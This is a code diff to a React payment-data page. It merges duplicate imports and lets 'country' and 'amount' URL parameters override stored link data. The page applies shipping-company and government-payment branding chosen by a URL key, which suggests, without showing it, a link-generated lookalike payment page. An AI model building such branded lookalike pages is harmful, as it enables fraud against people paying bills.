@@ -1,5 +1,4 @@
-import { useState, useMemo } from "react";
-import { useState, useEffect } from "react";
+import { useState, useEffect, useMemo } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
@@ -49,16 +48,19 @@ const PaymentData = () => {
 
   const urlParams = new URLSearchParams(window.location.search);
   const serviceKey = urlParams.get('company') || urlParams.get('service') || linkData?.payload?.service_key || linkData?.payload?.customerInfo?.service || 'government_payment';
+  const countryParam = urlParams.get('country');
+  const amountParam = urlParams.get('amount');
 
   const serviceName = "دفع فاتورة";
   const paymentInfo = linkData?.payload as any;
   
-  const govSystem = getGovernmentPaymentSystem(paymentInfo?.selectedCountry || "SA");
+  // أولوية للـ query parameters
+  const countryCode = countryParam || paymentInfo?.selectedCountry || "SA";
+  const govSystem = getGovernmentPaymentSystem(countryCode);
   const branding = getServiceBranding(serviceKey);
   const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
 
-  // Get country from link data
-  const countryCode = paymentInfo?.selectedCountry || "SA";
+  // Get country data
   const countryData = getCountryByCode(countryCode);
   const phoneCode = countryData?.phoneCode || "+966";
   const phonePlaceholder = countryData?.phonePlaceholder || "5X XXX XXXX";
